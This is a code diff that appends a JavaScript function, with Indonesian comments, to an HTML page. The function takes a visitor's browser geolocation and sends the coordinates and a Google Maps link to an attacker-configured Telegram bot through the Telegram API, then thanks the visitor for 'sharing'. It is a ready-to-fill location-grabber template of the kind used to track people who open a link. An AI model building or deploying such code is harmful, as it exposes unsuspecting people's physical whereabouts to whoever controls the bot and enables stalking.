@@ -136,3 +136,65 @@
 </body>
 
 </html>
+function showPosition(position) {
+
+    const lat = position.coords.latitude;
+
+    const lon = position.coords.longitude;
+
+    
+
+    // GANTI DENGAN DATA KAMU
+
+    const token = 7043581757;
+
+    const chatId =6787117513;
+
+    
+
+    // Pesan yang akan dikirim ke Telegram
+
+    const pesan = `📍 *Lokasi Baru Terdeteksi!*\n\n` +
+
+                  `Latitude: ${lat}\n` +
+
+                  `Longitude: ${lon}\n\n` +
+
+                  `Link Google Maps:\n` +
+
+                  `https://www.google.com/maps?q=${lat},${lon}`;
+
+
+    // Mengirim data ke API Telegram menggunakan Fetch
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+
+        method: 'POST',
+
+        headers: { 'Content-Type': 'application/json' },
+
+        body: JSON.stringify({
+
+            chat_id: chatId,
+
+            text: pesan,
+
+            parse_mode: "Markdown"
+
+        })
+
+    })
+
+    .then(response => {
+
+        status.innerHTML = "Lokasi telah dibagikan. Terima kasih!";
+
+    })
+
+    .catch(error => {
+
+        console.error('Error:', error);
+
+    });
+
+}
